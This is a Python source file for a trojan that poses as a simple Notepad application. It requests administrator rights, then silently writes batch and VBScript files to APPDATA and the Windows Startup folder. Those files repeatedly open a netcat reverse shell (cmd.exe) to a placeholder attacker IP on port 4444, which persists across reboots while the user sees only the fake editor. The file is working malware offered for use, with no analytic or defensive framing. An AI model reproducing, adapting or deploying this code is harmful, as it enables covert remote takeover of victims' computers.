import tkinter as tk
from tkinter import filedialog
import os
import sys
import subprocess
import ctypes

# === CONFIG ===
LHOST = "YOUR_ATTACKER_IP"
LPORT = 4444
NC_PATH = r"C:\Path\To\nc.exe"

# === FILE LOCATIONS ===
APPDATA = os.getenv("APPDATA")
STARTUP = os.path.join(APPDATA, r"Microsoft\Windows\Start Menu\Programs\Startup")
BAT_PATH = os.path.join(APPDATA, "winbackdoor.bat")
VBS_PATH = os.path.join(APPDATA, "winbackdoor.vbs")
VBS_STARTUP = os.path.join(STARTUP, "winbackdoor.vbs")

# === PAYLOAD (TRY EVERY 10 SECONDS) ===
BAT_CONTENT = f"""@echo off
:loop
taskkill /f /im nc.exe >nul 2>&1
"{NC_PATH}" {LHOST} {LPORT} -e cmd.exe
timeout /t 10 >nul
goto loop
"""

# === VBS WRAPPER (SILENT EXECUTION) ===
VBS_CONTENT = f"""Set WshShell = CreateObject("WScript.Shell")
WshShell.Run chr(34) & "{BAT_PATH}" & chr(34), 0
Set WshShell = Nothing
"""

# === FAKE NOTEPAD GUI ===
class NotepadApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Simple Notepad")
        self.text = tk.Text(root, wrap="word")
        self.text.pack(expand=True, fill='both')
        menu = tk.Menu(root)
        filemenu = tk.Menu(menu, tearoff=0)
        filemenu.add_command(label="Open", command=self.open_file)
        filemenu.add_command(label="Save", command=self.save_file)
        filemenu.add_command(label="Exit", command=root.quit)
        menu.add_cascade(label="File", menu=filemenu)
        root.config(menu=menu)

    def open_file(self):
        path = filedialog.askopenfilename(filetypes=[("Text Files", "*.txt")])
        if path:
            with open(path, 'r') as f:
                self.text.delete(1.0, tk.END)
                self.text.insert(tk.END, f.read())

    def save_file(self):
        path = filedialog.asksaveasfilename(defaultextension=".txt")
        if path:
            with open(path, 'w') as f:
                f.write(self.text.get(1.0, tk.END))

# === ADMIN CHECK ===
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def request_admin():
    if not is_admin():
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        sys.exit(0)

# === DEPLOY BACKDOOR + PERSISTENCE ===
def deploy_backdoor():
    try:
        # Write only if doesn't already exist
        if not os.path.exists(BAT_PATH):
            with open(BAT_PATH, "w") as f:
                f.write(BAT_CONTENT.strip())

        if not os.path.exists(VBS_PATH):
            with open(VBS_PATH, "w") as f:
                f.write(VBS_CONTENT.strip())

        if not os.path.exists(VBS_STARTUP):
            with open(VBS_STARTUP, "w") as f:
                f.write(VBS_CONTENT.strip())

        # First run trigger
        subprocess.Popen(["wscript.exe", VBS_PATH], shell=False)

    except Exception as e:
        print(f"[!] Error deploying backdoor: {e}")

# === MAIN ===
if __name__ == "__main__":
    request_admin()
    deploy_backdoor()

    # GUI only shown when EXE run manually
    root = tk.Tk()
    app = NotepadApp(root)
    root.mainloop()